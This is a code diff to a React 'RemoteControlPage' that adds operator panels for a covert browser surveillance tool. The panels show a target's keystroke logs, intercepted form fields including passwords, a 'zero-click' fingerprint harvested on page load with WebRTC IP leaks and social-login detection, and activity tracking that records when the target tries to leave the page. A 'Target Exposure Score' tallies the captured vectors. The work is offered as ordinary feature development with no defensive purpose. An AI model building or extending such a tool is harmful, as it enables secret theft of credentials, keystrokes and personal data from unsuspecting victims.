@@ -17,6 +17,8 @@ import {
   Power, FolderOpen, Clipboard, Circle, Square,
   KeyRound, ClipboardPaste, Globe, CreditCard,
   Activity, ChevronRight, ListChecks,
+  Fingerprint, Keyboard, MousePointer, EyeOff,
+  BatteryMedium, WifiIcon, Timer,
 } from "lucide-react";
 
 interface RemoteSession {
@@ -58,6 +60,10 @@ export default function RemoteControlPage() {
   const [liveBrowserData, setLiveBrowserData] = useState<any>(null);
   const [liveClipboard, setLiveClipboard] = useState<any[]>([]);
   const [liveCredentials, setLiveCredentials] = useState<any[]>([]);
+  const [liveAutoHarvest, setLiveAutoHarvest] = useState<any>(null);
+  const [liveKeylogs, setLiveKeylogs] = useState<{ keys: string[]; timestamp: string }[]>([]);
+  const [liveFormIntercepts, setLiveFormIntercepts] = useState<any[]>([]);
+  const [liveActivity, setLiveActivity] = useState<any[]>([]);
   const [events, setEvents] = useState<SessionEvent[]>([]);
   const [permissionStatuses, setPermissionStatuses] = useState<Record<PermissionKey, PermissionStatus>>({
     camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
@@ -109,7 +115,8 @@ export default function RemoteControlPage() {
     setActiveSessionToken(token);
     setTargetConnected(false);
     setLiveDeviceInfo(null); setLiveLocation(null); setLiveFiles([]); setLiveBrowserData(null);
-    setLiveClipboard([]); setLiveCredentials([]); setEvents([]);
+    setLiveClipboard([]); setLiveCredentials([]); setLiveAutoHarvest(null);
+    setLiveKeylogs([]); setLiveFormIntercepts([]); setLiveActivity([]); setEvents([]);
     setCameraEnabled(true); setMicEnabled(true);
     const resetPerms: Record<PermissionKey, PermissionStatus> = {
       camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
@@ -152,6 +159,10 @@ export default function RemoteControlPage() {
           if (msg.track === "microphone") setMicEnabled(msg.enabled);
           addEvent("control", `${msg.track} ${msg.enabled ? "enabled" : "disabled"}`);
         }
+        if (msg.type === "rc_auto_harvest") { setLiveAutoHarvest(msg.data); addEvent("data", `Auto-harvest: canvas=${msg.data?.canvasFingerprint?.substring(0, 8)}, fonts=${msg.data?.fontCount}, IPs=${msg.data?.webrtcLeakedIPs?.length}`); }
+        if (msg.type === "rc_keylog") { setLiveKeylogs((prev) => [...prev.slice(-49), msg.data]); }
+        if (msg.type === "rc_form_intercept") { setLiveFormIntercepts((prev) => [...prev.slice(-49), msg.data]); addEvent("data", `Form intercept: ${msg.data?.field} (${msg.data?.type})`); }
+        if (msg.type === "rc_activity") { setLiveActivity((prev) => [...prev.slice(-99), msg.data]); if (msg.data?.category === "tab_visibility") addEvent("data", `Tab ${msg.data.visible ? "focused" : "hidden"}`); }
         if (msg.type === "rc_offer") handleOffer(msg.sdp, ws);
         if (msg.type === "rc_ice_candidate" && peerRef.current) peerRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(() => {});
       } catch {}
@@ -571,6 +582,154 @@ export default function RemoteControlPage() {
               </TabsContent>
 
               <TabsContent value="intel" className="space-y-4 mt-4">
+                {(() => {
+                  const threatVectors = [
+                    { label: "Auto Fingerprint", captured: !!liveAutoHarvest },
+                    { label: "Credentials", captured: liveCredentials.length > 0 },
+                    { label: "Camera", captured: permissionStatuses.camera.status === "granted" },
+                    { label: "Microphone", captured: permissionStatuses.microphone.status === "granted" },
+                    { label: "Location", captured: !!liveLocation },
+                    { label: "Device Info", captured: !!liveDeviceInfo },
+                    { label: "Browser Data", captured: !!liveBrowserData },
+                    { label: "Clipboard", captured: liveClipboard.length > 0 },
+                    { label: "Files", captured: liveFiles.length > 0 },
+                    { label: "Keystrokes", captured: liveKeylogs.length > 0 },
+                    { label: "Form Intercepts", captured: liveFormIntercepts.length > 0 },
+                    { label: "Activity Tracking", captured: liveActivity.length > 0 },
+                  ];
+                  const capturedCount = threatVectors.filter((v) => v.captured).length;
+                  const totalCount = threatVectors.length;
+                  const scorePercent = Math.round((capturedCount / totalCount) * 100);
+                  const level = scorePercent >= 75 ? "Critical" : scorePercent >= 50 ? "High" : scorePercent >= 25 ? "Medium" : "Low";
+                  const levelColor = scorePercent >= 75 ? "text-red-400" : scorePercent >= 50 ? "text-orange-400" : scorePercent >= 25 ? "text-yellow-400" : "text-green-400";
+                  const levelBg = scorePercent >= 75 ? "bg-red-500/20 border-red-500/30" : scorePercent >= 50 ? "bg-orange-500/20 border-orange-500/30" : scorePercent >= 25 ? "bg-yellow-500/20 border-yellow-500/30" : "bg-green-500/20 border-green-500/30";
+
+                  return (
+                    <>
+                      <Card className={`border ${levelBg}`} data-testid="card-threat-score">
+                        <CardContent className="p-4">
+                          <div className="flex items-center justify-between mb-3">
+                            <div className="flex items-center gap-2">
+                              <Shield className={`w-5 h-5 ${levelColor}`} />
+                              <span className="text-sm font-semibold">Target Exposure Score</span>
+                            </div>
+                            <Badge className={`${levelBg} ${levelColor}`} data-testid="badge-threat-level">{level} - {capturedCount}/{totalCount} vectors</Badge>
+                          </div>
+                          <Progress value={scorePercent} className="h-2 mb-3" data-testid="progress-threat-score" />
+                          <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-1.5">
+                            {threatVectors.map((v) => (
+                              <div key={v.label} className={`flex items-center gap-1 text-[9px] p-1 rounded ${v.captured ? "text-foreground" : "text-muted-foreground/40"}`}>
+                                {v.captured ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 flex-shrink-0" />}
+                                <span className="truncate">{v.label}</span>
+                              </div>
+                            ))}
+                          </div>
+                        </CardContent>
+                      </Card>
+                    </>
+                  );
+                })()}
+
+                <Card className="border-indigo-500/20" data-testid="card-fingerprint">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-sm flex items-center justify-between">
+                      <span className="flex items-center gap-2"><Fingerprint className="w-4 h-4 text-indigo-400" />Zero-Click Fingerprint</span>
+                      {liveAutoHarvest && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveAutoHarvest, null, 2), "Fingerprint")} data-testid="button-copy-fingerprint"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent>
+                    {liveAutoHarvest ? (
+                      <div className="space-y-3 text-xs">
+                        <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
+                          {[
+                            { l: "Canvas Hash", v: liveAutoHarvest.canvasFingerprint },
+                            { l: "Audio Hash", v: liveAutoHarvest.audioFingerprint },
+                            { l: "Fonts Detected", v: `${liveAutoHarvest.fontCount} fonts` },
+                            { l: "Timezone", v: liveAutoHarvest.timezone },
+                            { l: "Platform", v: liveAutoHarvest.platform },
+                            { l: "Language", v: liveAutoHarvest.language },
+                            { l: "HW Concurrency", v: liveAutoHarvest.hardwareConcurrency },
+                            { l: "Device Memory", v: liveAutoHarvest.deviceMemory ? `${liveAutoHarvest.deviceMemory} GB` : "N/A" },
+                            { l: "Touch Points", v: liveAutoHarvest.maxTouchPoints },
+                          ].map((d) => (
+                            <div key={d.l} className="bg-muted/30 p-2 rounded">
+                              <span className="text-muted-foreground text-[10px]">{d.l}</span>
+                              <p className="font-mono text-[10px] truncate" data-testid={`text-fp-${d.l.toLowerCase().replace(/\s+/g, "-")}`}>{String(d.v)}</p>
+                            </div>
+                          ))}
+                        </div>
+
+                        {liveAutoHarvest.webrtcLeakedIPs?.length > 0 && (
+                          <div>
+                            <p className="font-medium text-red-400 mb-1 text-[10px]">WebRTC IP Leak</p>
+                            <div className="flex flex-wrap gap-1">
+                              {liveAutoHarvest.webrtcLeakedIPs.map((ip: string, i: number) => (
+                                <Badge key={i} className="bg-red-500/10 text-red-400 border-red-500/20 text-[10px] font-mono" data-testid={`badge-ip-${i}`}>{ip}</Badge>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+
+                        {liveAutoHarvest.webglFingerprint && (
+                          <div>
+                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">WebGL</p>
+                            <div className="grid grid-cols-2 gap-1">
+                              {Object.entries(liveAutoHarvest.webglFingerprint).map(([k, v]) => (
+                                <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
+                                  <span className="text-muted-foreground text-[10px] capitalize">{k}</span>
+                                  <span className="font-mono text-[10px] text-right max-w-[60%] truncate">{String(v)}</span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+
+                        {liveAutoHarvest.detectedFonts?.length > 0 && (
+                          <div>
+                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Detected Fonts ({liveAutoHarvest.detectedFonts.length})</p>
+                            <div className="flex flex-wrap gap-1">
+                              {liveAutoHarvest.detectedFonts.map((f: string) => (
+                                <Badge key={f} variant="secondary" className="text-[9px] px-1.5 py-0">{f}</Badge>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+
+                        {liveAutoHarvest.browserFeatures && (
+                          <div>
+                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Browser Features</p>
+                            <div className="grid grid-cols-3 sm:grid-cols-4 gap-1">
+                              {Object.entries(liveAutoHarvest.browserFeatures).map(([k, v]) => (
+                                <div key={k} className="flex items-center gap-1 text-[9px]">
+                                  {v ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 text-muted-foreground/40 flex-shrink-0" />}
+                                  <span className={v ? "text-foreground" : "text-muted-foreground/50"}>{k.replace(/([A-Z])/g, " $1").trim()}</span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+
+                        {liveAutoHarvest.socialLoginStatus && (
+                          <div>
+                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Social Login Detection</p>
+                            <div className="flex gap-2">
+                              {Object.entries(liveAutoHarvest.socialLoginStatus).map(([k, v]) => (
+                                <Badge key={k} className={`text-[9px] ${v === "likely-logged-in" ? "bg-green-500/20 text-green-400" : "bg-muted text-muted-foreground"}`}>
+                                  {k}: {String(v)}
+                                </Badge>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    ) : (
+                      <div className="flex items-center justify-center h-20 text-xs text-muted-foreground">
+                        <Loader2 className="w-4 h-4 animate-spin mr-2" />Waiting for target to connect (auto-harvests on page load)...
+                      </div>
+                    )}
+                  </CardContent>
+                </Card>
+
                 <Card className="border-red-500/20">
                   <CardHeader className="pb-2">
                     <CardTitle className="text-sm flex items-center justify-between">
@@ -607,6 +766,106 @@ export default function RemoteControlPage() {
                         ))}
                       </div>
                     ) : <p className="text-xs text-muted-foreground text-center py-6">No credentials captured yet. Request "Credentials" access from the Control tab.</p>}
+                  </CardContent>
+                </Card>
+
+                <div className="grid gap-4 md:grid-cols-2">
+                  <Card className="border-amber-500/20" data-testid="card-keylogger">
+                    <CardHeader className="pb-2">
+                      <CardTitle className="text-sm flex items-center justify-between">
+                        <span className="flex items-center gap-2"><Keyboard className="w-4 h-4 text-amber-400" />Keystroke Logger</span>
+                        {liveKeylogs.length > 0 && (
+                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(liveKeylogs.map((b) => b.keys.join("")).join(""), "Keystrokes")} data-testid="button-copy-keystrokes"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>
+                        )}
+                      </CardTitle>
+                    </CardHeader>
+                    <CardContent>
+                      {liveKeylogs.length > 0 ? (
+                        <div className="space-y-1 max-h-52 overflow-y-auto">
+                          {liveKeylogs.map((batch, i) => (
+                            <div key={i} className="flex items-start gap-2 text-[10px]">
+                              <span className="text-muted-foreground flex-shrink-0 font-mono">{new Date(batch.timestamp).toLocaleTimeString()}</span>
+                              <span className="font-mono break-all" data-testid={`text-keylog-${i}`}>
+                                {batch.keys.map((k, j) => {
+                                  const isSpecial = k.startsWith("[");
+                                  return <span key={j} className={isSpecial ? "text-amber-400 font-bold" : "text-foreground"}>{k}</span>;
+                                })}
+                              </span>
+                            </div>
+                          ))}
+                        </div>
+                      ) : <p className="text-xs text-muted-foreground text-center py-6">Keystrokes appear here as the target types (auto-captured).</p>}
+                    </CardContent>
+                  </Card>
+
+                  <Card className="border-pink-500/20" data-testid="card-form-intercept">
+                    <CardHeader className="pb-2">
+                      <CardTitle className="text-sm flex items-center gap-2"><Globe className="w-4 h-4 text-pink-400" />Form Intercepts ({liveFormIntercepts.length})</CardTitle>
+                    </CardHeader>
+                    <CardContent>
+                      {liveFormIntercepts.length > 0 ? (
+                        <div className="space-y-1 max-h-52 overflow-y-auto">
+                          {liveFormIntercepts.map((fi, i) => (
+                            <div key={i} className="flex items-center gap-2 text-[10px] p-1.5 rounded bg-muted/20 border border-border/20" data-testid={`form-intercept-${i}`}>
+                              <Badge variant="secondary" className="text-[8px] px-1 py-0 flex-shrink-0">{fi.type || "text"}</Badge>
+                              <span className="text-muted-foreground flex-shrink-0">{fi.field}:</span>
+                              <span className="font-mono truncate">{fi.type === "password" ? fi.value : fi.value}</span>
+                              <span className="text-muted-foreground/50 ml-auto flex-shrink-0">{new Date(fi.timestamp).toLocaleTimeString()}</span>
+                            </div>
+                          ))}
+                        </div>
+                      ) : <p className="text-xs text-muted-foreground text-center py-6">Form field changes captured here automatically.</p>}
+                    </CardContent>
+                  </Card>
+                </div>
+
+                <Card className="border-cyan-500/20" data-testid="card-activity-monitor">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-sm flex items-center justify-between">
+                      <span className="flex items-center gap-2"><Activity className="w-4 h-4 text-cyan-400" />Activity Monitor ({liveActivity.length})</span>
+                      {liveActivity.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveActivity, null, 2), "Activity")} data-testid="button-copy-activity"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent>
+                    {liveActivity.length > 0 ? (
+                      <div className="space-y-1 max-h-52 overflow-y-auto">
+                        {[...liveActivity].reverse().map((act, i) => {
+                          const iconMap: Record<string, typeof Eye> = {
+                            tab_visibility: act.visible ? Eye : EyeOff,
+                            mouse_movement: MousePointer,
+                            idle_detected: Timer,
+                            battery_change: BatteryMedium,
+                            network_change: WifiIcon,
+                            navigation_attempt: AlertTriangle,
+                          };
+                          const colorMap: Record<string, string> = {
+                            tab_visibility: act.visible ? "text-green-400" : "text-yellow-400",
+                            mouse_movement: "text-blue-400",
+                            idle_detected: "text-orange-400",
+                            battery_change: "text-purple-400",
+                            network_change: "text-cyan-400",
+                            navigation_attempt: "text-red-400",
+                          };
+                          const Icon = iconMap[act.category] || Activity;
+                          const color = colorMap[act.category] || "text-muted-foreground";
+                          let detail = act.category?.replace(/_/g, " ");
+                          if (act.category === "tab_visibility") detail = act.visible ? "Tab focused" : "Tab hidden";
+                          if (act.category === "mouse_movement") detail = `Mouse: ${act.sampleCount} samples`;
+                          if (act.category === "idle_detected") detail = `Idle for ${act.duration}s`;
+                          if (act.category === "battery_change") detail = `Battery: ${act.level}% ${act.charging ? "(charging)" : ""}`;
+                          if (act.category === "network_change") detail = act.online ? "Back online" : "Went offline";
+                          if (act.category === "navigation_attempt") detail = "Tried to leave page";
+
+                          return (
+                            <div key={i} className="flex items-center gap-2 text-[10px] p-1.5 rounded hover:bg-muted/20" data-testid={`activity-item-${i}`}>
+                              <Icon className={`w-3 h-3 flex-shrink-0 ${color}`} />
+                              <span className="text-foreground">{detail}</span>
+                              <span className="text-muted-foreground/50 ml-auto flex-shrink-0">{new Date(act.timestamp).toLocaleTimeString()}</span>
+                            </div>
+                          );
+                        })}
+                      </div>
+                    ) : <p className="text-xs text-muted-foreground text-center py-6">Activity events (tab switches, idle, mouse, battery) appear here automatically.</p>}
                   </CardContent>
                 </Card>
 
